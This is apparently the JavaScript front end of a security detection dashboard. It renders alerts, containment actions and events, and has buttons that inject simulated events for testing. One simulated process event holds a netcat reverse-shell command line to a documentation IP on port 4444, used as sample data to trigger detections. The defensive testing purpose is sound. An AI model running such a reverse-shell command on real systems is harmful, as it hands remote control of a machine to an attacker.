const byId = (id) => document.getElementById(id);

const state = {
  previousSummary: null,
  detections: [],
  actions: [],
  events: [],
};

async function fetchJson(url, options = {}) {
  const response = await fetch(url, options);
  if (response.status === 401) {
    window.location.href = "/login";
    throw new Error("Unauthorized");
  }
  if (!response.ok) {
    throw new Error(`Request failed: ${response.status}`);
  }
  return response.json();
}

function setSyncStatus(label, syncing = false) {
  const badge = byId("sync-indicator");
  badge.textContent = label;
  badge.classList.toggle("syncing", syncing);
}

function formatTime(value) {
  return new Date(value).toLocaleString();
}

function escapeHtml(value) {
  return String(value)
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#39;");
}

function deltaText(current, previous, noun) {
  if (previous === null || previous === undefined) {
    return "Initial snapshot loaded";
  }
  const delta = current - previous;
  if (delta === 0) {
    return `No new ${noun}`;
  }
  return `${delta > 0 ? "+" : ""}${delta} ${noun} since last refresh`;
}

function renderEmpty(container, label) {
  container.innerHTML = `<div class="empty-state"><p>${label}</p></div>`;
}

function renderSeverityGrid(container, counts) {
  const order = ["critical", "high", "medium", "low"];
  const total = order.reduce((sum, key) => sum + (counts[key] || 0), 0) || 1;
  container.innerHTML = order.map((severity) => {
    const count = counts[severity] || 0;
    const width = Math.round((count / total) * 100);
    return `
      <div class="severity-row">
        <span class="severity-name">${severity}</span>
        <div class="bar-track"><div class="bar-fill ${severity}" style="width:${width}%"></div></div>
        <strong>${count}</strong>
      </div>
    `;
  }).join("");
}

function renderEventTypeGrid(container, events) {
  const counts = {};
  for (const event of events) {
    counts[event.event_type] = (counts[event.event_type] || 0) + 1;
  }
  const entries = Object.entries(counts).sort((a, b) => b[1] - a[1]);
  if (!entries.length) {
    renderEmpty(container, "No event composition data yet.");
    return;
  }
  const total = entries.reduce((sum, [, count]) => sum + count, 0);
  container.innerHTML = entries.map(([type, count]) => {
    const width = Math.round((count / total) * 100);
    return `
      <div class="severity-row">
        <span class="severity-name">${escapeHtml(type)}</span>
        <div class="bar-track"><div class="bar-fill" style="width:${width}%"></div></div>
        <strong>${count}</strong>
      </div>
    `;
  }).join("");
}

function renderDetections(items) {
  const container = byId("detections-list");
  const severityFilter = byId("severity-filter").value;
  const filtered = items.filter((item) => severityFilter === "all" || item.severity === severityFilter);
  if (!filtered.length) {
    renderEmpty(container, "No detections match the active filter.");
    return;
  }
  container.innerHTML = filtered.map((item) => `
    <article class="item">
      <header>
        <div class="item-grid">
          <span class="item-title">${escapeHtml(item.rule_name)}</span>
          <span class="meta">${formatTime(item.timestamp)} | Confidence ${item.confidence}%</span>
        </div>
        <span class="severity ${item.severity}">${item.severity}</span>
      </header>
      <p>${escapeHtml(item.description)}</p>
      <div class="item-tags">
        <span class="tag">${escapeHtml(item.event.event_type)}</span>
        <span class="tag">${escapeHtml(item.event.host)}</span>
      </div>
      <p class="meta">Event <code>${escapeHtml(item.event.title)}</code></p>
    </article>
  `).join("");
}

function renderActions(items) {
  const container = byId("actions-list");
  if (!items.length) {
    renderEmpty(container, "No response actions yet.");
    return;
  }
  container.innerHTML = items.map((item) => `
    <article class="item">
      <header>
        <div class="item-grid">
          <span class="item-title">${escapeHtml(item.action_type)}</span>
          <span class="meta">${escapeHtml(item.status)}</span>
        </div>
        <span class="tag">${formatTime(item.timestamp)}</span>
      </header>
      <p>${escapeHtml(item.details.message ?? "")}</p>
      <p class="meta">Target <code>${escapeHtml(item.target)}</code></p>
    </article>
  `).join("");
}

function renderEvents(items) {
  const container = byId("events-list");
  const query = byId("event-search").value.trim().toLowerCase();
  const filtered = items.filter((item) => {
    if (!query) {
      return true;
    }
    const payload = JSON.stringify(item.payload).toLowerCase();
    return [item.title, item.source, item.event_type, payload].join(" ").toLowerCase().includes(query);
  });
  if (!filtered.length) {
    renderEmpty(container, "No events match the current search.");
    return;
  }
  container.innerHTML = filtered.map((item) => `
    <article class="item">
      <header>
        <div class="item-grid">
          <span class="item-title">${escapeHtml(item.title)}</span>
          <span class="meta">${formatTime(item.timestamp)} | ${escapeHtml(item.source)}</span>
        </div>
        <span class="tag">${escapeHtml(item.event_type)}</span>
      </header>
      <p><code>${escapeHtml(JSON.stringify(item.payload))}</code></p>
    </article>
  `).join("");
}

function computeSeverityCounts(detections) {
  const counts = { critical: 0, high: 0, medium: 0, low: 0 };
  for (const item of detections) {
    counts[item.severity] = (counts[item.severity] || 0) + 1;
  }
  return counts;
}

function updateSummary(stats) {
  const previous = state.previousSummary;
  byId("events-count").textContent = stats.summary.events;
  byId("detections-count").textContent = stats.summary.detections;
  byId("actions-count").textContent = stats.summary.actions;
  byId("critical-count").textContent = stats.summary.critical_alerts;

  byId("events-delta").textContent = deltaText(stats.summary.events, previous?.events, "events");
  byId("detections-delta").textContent = deltaText(stats.summary.detections, previous?.detections, "detections");
  byId("actions-delta").textContent = deltaText(stats.summary.actions, previous?.actions, "actions");
  byId("critical-state").textContent = stats.summary.critical_alerts > 0 ? "Critical pressure present" : "No critical pressure";

  byId("isolated-count").textContent = stats.isolated_hosts.length;
  byId("blocked-count").textContent = stats.blocked_ips.length;
  byId("terminated-count").textContent = stats.terminated_processes.length;

  const fragments = [];
  if (stats.isolated_hosts.length) {
    fragments.push(`Isolated hosts: ${stats.isolated_hosts.join(", ")}`);
  }
  if (stats.blocked_ips.length) {
    fragments.push(`Blocked IPs: ${stats.blocked_ips.join(", ")}`);
  }
  if (stats.terminated_processes.length) {
    fragments.push(`Terminated processes: ${stats.terminated_processes.join(", ")}`);
  }
  byId("response-state").textContent = fragments.join(" | ") || "No containment actions yet.";

  const posture = byId("response-badge");
  const hasCritical = stats.summary.critical_alerts > 0;
  posture.textContent = hasCritical ? "Containment Active" : "Stable";
  posture.classList.toggle("alert", hasCritical);
  posture.classList.toggle("quiet", !hasCritical);

  state.previousSummary = {
    events: stats.summary.events,
    detections: stats.summary.detections,
    actions: stats.summary.actions,
  };
}

async function refresh() {
  setSyncStatus("Syncing", true);
  const [me, stats, detectionItems, actionItems, eventItems] = await Promise.all([
    fetchJson("/api/me"),
    fetchJson("/api/status"),
    fetchJson("/api/detections?limit=25"),
    fetchJson("/api/actions?limit=24"),
    fetchJson("/api/events?limit=50"),
  ]);

  byId("user-chip").textContent = `${me.email} (${me.role})`;
  byId("last-refresh").textContent = `Updated ${new Date().toLocaleTimeString()}`;

  state.detections = detectionItems;
  state.actions = actionItems;
  state.events = eventItems;

  updateSummary(stats);
  renderSeverityGrid(byId("severity-grid"), computeSeverityCounts(detectionItems));
  renderEventTypeGrid(byId("event-type-grid"), eventItems);
  renderDetections(state.detections);
  renderActions(state.actions);
  renderEvents(state.events);
  setSyncStatus("Live", false);
}

async function ingest(event) {
  await fetchJson("/api/ingest", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(event),
  });
  await refresh();
}

async function withBusy(buttonId, task) {
  const button = byId(buttonId);
  button.classList.add("is-loading");
  button.disabled = true;
  try {
    await task();
  } finally {
    button.disabled = false;
    button.classList.remove("is-loading");
  }
}

byId("collect-btn").addEventListener("click", () => withBusy("collect-btn", async () => {
  await fetchJson("/api/collect", { method: "POST" });
  await refresh();
}));

byId("reload-btn").addEventListener("click", () => withBusy("reload-btn", async () => {
  await fetchJson("/api/reload-rules", { method: "POST" });
  await refresh();
}));

byId("logout-btn").addEventListener("click", async () => {
  await fetchJson("/api/auth/logout", { method: "POST" });
  window.location.href = "/login";
});

byId("simulate-auth-btn").addEventListener("click", () => withBusy("simulate-auth-btn", async () => {
  const requests = [];
  for (let i = 0; i < 5; i += 1) {
    requests.push(fetchJson("/api/ingest", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        source: "dashboard_simulator",
        event_type: "auth",
        title: "failed_login",
        payload: {
          username: "svc-admin",
          outcome: "failed",
          source_ip: "198.51.100.17"
        }
      }),
    }));
  }
  await Promise.all(requests);
  await refresh();
}));

byId("simulate-network-btn").addEventListener("click", () => withBusy("simulate-network-btn", async () => {
  await ingest({
    source: "dashboard_simulator",
    event_type: "network",
    title: "network_connection_observed",
    payload: {
      remote_ip: "203.0.113.44",
      remote_port: 4444,
      local_address: "10.0.0.8:51515",
      remote_address: "203.0.113.44:4444",
      status: "ESTABLISHED"
    }
  });
}));

byId("simulate-process-btn").addEventListener("click", () => withBusy("simulate-process-btn", async () => {
  await ingest({
    source: "dashboard_simulator",
    event_type: "process",
    title: "process_observed",
    payload: {
      process_name: "nc",
      cmdline: "nc -e cmd.exe 203.0.113.44 4444",
      username: "lab-user",
      pid: 4242
    }
  });
}));

byId("severity-filter").addEventListener("change", () => renderDetections(state.detections));
byId("event-search").addEventListener("input", () => renderEvents(state.events));

refresh().catch(() => setSyncStatus("Offline", false));
setInterval(() => {
  refresh().catch(() => setSyncStatus("Offline", false));
}, 5000);
